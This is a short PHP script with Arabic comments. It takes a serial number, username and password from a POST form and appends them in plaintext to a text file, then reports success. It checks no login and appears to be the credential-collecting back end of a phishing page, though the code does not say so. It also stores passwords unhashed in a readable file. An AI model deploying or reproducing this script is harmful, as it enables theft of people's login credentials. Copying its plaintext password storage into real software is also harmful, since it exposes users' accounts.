<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // استقبال البيانات المرسلة عبر POST
    $sn = $_POST['sn'];
    $username = $_POST['username'];
    $password = $_POST['password'];

    // صيغة لتخزين البيانات في ملف نصي
    $file = fopen("login_data.txt", "a"); // فتح الملف في وضع الإضافة
    if ($file) {
        // صيغة البيانات (يمكنك تعديل هذا الشكل حسب الحاجة)
        $data = "SN: $sn, Username: $username, Password: $password\n";
        fwrite($file, $data); // كتابة البيانات في الملف
        fclose($file); // إغلاق الملف
        echo "Data saved successfully.";
    } else {
        echo "Error opening the file.";
    }
}
?>
